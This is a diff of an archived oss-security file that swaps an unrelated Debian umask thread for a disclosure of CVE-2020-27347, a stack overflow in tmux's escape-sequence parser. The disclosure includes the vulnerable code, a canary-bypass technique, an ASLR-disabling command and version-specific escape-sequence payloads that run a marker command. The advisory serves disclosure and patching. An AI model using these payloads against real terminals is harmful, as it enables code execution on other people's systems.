@@ -1,52 +1,80 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/08/1
-Message-ID: <20201008003001.GE378617@millbarge>
-Date: Thu, 8 Oct 2020 00:30:01 +0000
-From: Seth Arnold <seth.arnold@...onical.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/05/3
+Message-ID: <0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>
+Date: Thu, 05 Nov 2020 16:03:12 +0300
+From: snizovtsev@...il.com
 To: oss-security@...ts.openwall.com
-Subject: Re: Debian FEATURE: /home/loser is with permissions 755, default umask 0022
+Subject: CVE-2020-27347: tmux buffer overflow in escape sequence parser
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Oct 07, 2020 at 04:09:59PM -0500, Bob Friesenhahn wrote:
-> Ubuntu Linux (a Debian derivative) has changed the default.  However, we
-> found that the Ubuntu default caused problems for us while building our
-> software, and so we changed them back.
+Hi,
 
-Hello Bob, can you please share some details on this?
+I recently discovered a bug in tmux (terminal multiplexer) which could
+lead to crash or code execution. The bug was in
+`input_csi_dispatch_sgr_colon` function which is used by tmux server
+process.
 
-I expect Ubuntu home directories to be 755 by default:
-https://wiki.ubuntu.com/SecurityTeam/Policies#Permissive_Home_Directory_Access
+The problem is that a bound check for a stack-allocated array `p` is
+bypassed if 8th chunk of input buffer is empty:
 
-And while it is very difficult to say "the umask", given that every
-process's umask setting depends upon the actions of not only itself but
-also its nearest parent to use the umask(2) syscall, but:
+        while ((out = strsep(&ptr, ":")) != NULL) {
+                if (*out != '\0') {
+                        p[n++] = strtonum(out, 0, INT_MAX, &errstr);
+                        if (errstr != NULL || n == nitems(p)) {
+                                return;
+                        }
+                } else
+                        n++;
+        }
 
-$ grep ^UMASK /etc/login.defs
-UMASK		022
+Thus by using an escape sequence like "\033[::::::7::1:2:3::5:6:7:m" we
+can overwrite arbitrary 4-byte locations on the stack. Moreover, an
+empty arguments ("::") may be used to skip choosen offsets, and thereby
+keep stack canaries untouched.
 
-$ systemctl show -p UMask '*' | sort -u
+Code execution is proved practical only if tmux address space isn't
+fully randomized. So ASLR with PIE will mitigiate this issue but more
+complex exploits may be theoretically created.
 
-UMask=0022
+=== Affected versions / distributions ===
 
-I'd certainly expect the default settings to be a umask of 0022, there's a
-variety of umasks on the systems I've got easy access to:
+- tmux 2.9-3.1b
+- Ubuntu 20.04
+- Debian 11
+- Fedora 31+
+- Alpine 3.10+
+- openSUSE Leap 15.2
+- OpenBSD 6.5+
 
-$ sudo grep -h Umask /proc/*/status | sort -u
-Umask:	0000
-Umask:	0002
-Umask:	0022
-Umask:	0077
-Umask:	0777
-$ sudo grep -h Umask /proc/*/status | sort -u
-Umask:	0000
-Umask:	0002
-Umask:	0022
-Umask:	0077
-$ sudo grep -h Umask /proc/*/status | sort -u
-Umask:	0000
-Umask:	0002
-Umask:	0022
+=== Exploitation (testing purposes only) ===
 
-Thanks
+I haven't found any ways to leak addresses so ASLR must be disabled:
+sysctl -w kernel.randomize_va_space=0
 
-Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
+Then open tmux and feed it with the following sequence:
+
+for tmux 3.0a-2ubuntu0.1 on Ubuntu 20.04.1 x86_64:
+
+echo -e
+'\033[::::::::::::::::::1431728064::::::::1431829797::::1431915746::m;t
+ouch /tmp/PWNED;\0';
+ 
+for tmux-3.1-2.fc33.x86_64 on Fedora 33:
+echo -e
+'\033[::::::::::::::::::1431723856::::::::1432185743::::1431836040::m;t
+ouch /tmp/PWNED;\0';
+
+If done, `/tmp/PWNED` would indicate that the attack succeed.
+
+=== Timeline ===
+* 29 Oct 2020 - Vulnerability reported to author, security ()
+openbsd.org, RedHat, SUSE and Canonical.
+* 29 Oct 2020 - OpenBSD Errata published.
+* 29 Oct 2020 - Fixed in OpenBSD and tmux 3.1c.
+* 30 Oct 2020 - CVE-2020-27347 assigned.
+* 05 Nov 2020 - Vulnerability opened.
+
+--
+Regards,
+Sergey Nizovtsev.
+
